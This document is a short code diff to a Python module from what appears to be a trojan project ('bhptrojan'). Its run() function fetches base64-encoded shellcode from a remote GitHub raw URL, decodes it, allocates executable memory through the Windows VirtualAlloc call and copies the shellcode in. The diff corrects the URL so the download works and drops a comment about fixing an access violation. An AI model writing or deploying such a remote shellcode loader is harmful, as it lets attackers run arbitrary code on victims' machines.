@@ -4,15 +4,14 @@ import urllib.request
 
 def run(**args):
     try:
-        url = "https://github.com/leducymta/bhptrojan/blob/master/shellcode/shellcode.b64"
+        url = "https://raw.githubusercontent.com/leducymta/bhptrojan/master/shellcode/shellcode.b64"
         encoded = urllib.request.urlopen(url).read()
         shellcode = base64.b64decode(encoded)
         size = len(shellcode)
 
         kernel32 = ctypes.windll.kernel32
         ptr = kernel32.VirtualAlloc(
-            None,
-            size,
+            None, size,
             0x3000,  # MEM_COMMIT | MEM_RESERVE
             0x40     # PAGE_EXECUTE_READWRITE
         )
@@ -20,7 +19,6 @@ def run(**args):
         if not ptr:
             return "[!] Failed to allocate memory"
 
-        # ✅ KHẮC PHỤC HOÀN TOÀN access violation
         buffer = ctypes.create_string_buffer(shellcode, size)
         ctypes.memmove(ptr, buffer, size)
 
